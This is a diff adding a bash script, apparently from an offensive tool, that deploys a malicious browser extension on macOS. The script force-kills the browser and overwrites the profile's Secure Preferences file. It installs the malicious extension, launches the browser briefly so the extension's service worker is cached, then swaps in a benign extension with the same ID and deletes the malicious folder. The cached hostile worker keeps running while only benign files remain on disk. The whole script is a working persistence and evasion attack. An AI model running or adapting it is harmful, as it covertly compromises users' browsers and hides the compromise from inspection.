@@ -1,0 +1,84 @@
+#!/bin/bash
+# gap - macOS deployment script (mirror of inject.bat).
+# Run on the target from the extracted _deploy.zip:  bash inject.sh
+set -u
+
+DEPLOY_DIR="$(cd "$(dirname "$0")" && pwd)"
+PROFILE_PATH="$HOME/Library/Application Support/{{BROWSER_PROFILE_PATH}}"
+PROC_NAME="{{BROWSER_PROC_NAME}}"
+BROWSER_TARGET_DIR="{{BROWSER_TARGET_DIR}}"
+
+CLEAN_PREFS="$DEPLOY_DIR/SecurePreferencesClean"
+PREFS_MALICIOUS="$DEPLOY_DIR/Secure Preferences A"
+PREFS_BENIGN="$DEPLOY_DIR/Secure Preferences B"
+
+# Force-kill the browser and wait until every process is gone. SIGKILL (-9) is
+# mandatory: on SIGTERM the browser shuts down gracefully and REWRITES Secure
+# Preferences on the way out, which races with (and clobbers) our patched drop.
+kill_browser() {
+    pkill -9 -f "$PROC_NAME" 2>/dev/null || true
+    for _ in $(seq 1 20); do
+        pgrep -f "$PROC_NAME" >/dev/null 2>&1 || return 0
+        sleep 0.5
+    done
+}
+
+# Sanity checks
+[ -f "$CLEAN_PREFS" ]        || { echo "[!] SecurePreferencesClean not found"; exit 1; }
+[ -f "$PREFS_MALICIOUS" ]    || { echo "[!] Secure Preferences A not found"; exit 1; }
+[ -f "$PREFS_BENIGN" ]       || { echo "[!] Secure Preferences B not found"; exit 1; }
+[ -f "$DEPLOY_DIR/extension_malicious/manifest.json" ] || { echo "[!] extension_malicious/ not found"; exit 1; }
+[ -f "$DEPLOY_DIR/extension_benign/manifest.json" ]    || { echo "[!] extension_benign/ not found"; exit 1; }
+[ -d "$PROFILE_PATH" ]       || { echo "[!] Browser profile not found: $PROFILE_PATH"; exit 1; }
+
+# ============================================================
+# Phase 1 - Deploy malicious extension A, then cache its worker
+# ============================================================
+
+# Kill browser
+echo "[*] Killing $PROC_NAME ..."
+kill_browser
+
+# Restore clean Secure Preferences to avoid collision
+echo "[*] Restoring clean Secure Preferences..."
+cp -f "$CLEAN_PREFS" "$PROFILE_PATH/Secure Preferences" || { echo "[!] Failed to restore clean Secure Preferences"; exit 1; }
+
+# Copy malicious extension A
+echo "[*] Copying malicious extension to $BROWSER_TARGET_DIR/{{MALICIOUS_NAME}}..."
+mkdir -p "$BROWSER_TARGET_DIR"
+rm -rf "$BROWSER_TARGET_DIR/{{MALICIOUS_NAME}}"
+cp -R "$DEPLOY_DIR/extension_malicious" "$BROWSER_TARGET_DIR/{{MALICIOUS_NAME}}" || { echo "[!] Failed to copy malicious extension"; exit 1; }
+
+# Drop Secure Preferences A (malicious)
+echo "[*] Overwriting Secure Preferences (malicious)..."
+cp -f "$PREFS_MALICIOUS" "$PROFILE_PATH/Secure Preferences" || { echo "[!] Failed to overwrite Secure Preferences (malicious)"; exit 1; }
+
+# Open then close browser -> register service worker + cache background.js.
+# This step is MANDATORY: it is what caches A's compiled worker in ScriptCache.
+echo "[*] Opening {{BROWSER_NAME}} to cache the service worker..."
+open -a "$PROC_NAME" 2>/dev/null || true
+sleep 5
+kill_browser
+
+# ============================================================
+# Phase 2 - Stomp with benign extension B (same extension ID)
+# ============================================================
+
+# Copy benign extension B
+echo "[*] Copying benign extension to $BROWSER_TARGET_DIR/{{BENIGN_NAME}}..."
+mkdir -p "$BROWSER_TARGET_DIR"
+rm -rf "$BROWSER_TARGET_DIR/{{BENIGN_NAME}}"
+cp -R "$DEPLOY_DIR/extension_benign" "$BROWSER_TARGET_DIR/{{BENIGN_NAME}}" || { echo "[!] Failed to copy benign extension"; exit 1; }
+
+# Drop Secure Preferences B (benign) over the malicious one.
+# The Service Worker DB and ScriptCache are NOT touched, so A's worker survives.
+echo "[*] Overwriting Secure Preferences (benign)..."
+cp -f "$PREFS_BENIGN" "$PROFILE_PATH/Secure Preferences" || { echo "[!] Failed to overwrite Secure Preferences (benign)"; exit 1; }
+
+# Remove malicious folder A - only the benign folder remains on disk.
+if [ "{{MALICIOUS_NAME}}" != "{{BENIGN_NAME}}" ]; then
+    echo "[*] Removing malicious extension folder..."
+    rm -rf "$BROWSER_TARGET_DIR/{{MALICIOUS_NAME}}" 2>/dev/null || true
+fi
+
+echo "[+] Done. Launch {{BROWSER_NAME}} - the cached malicious worker will execute."
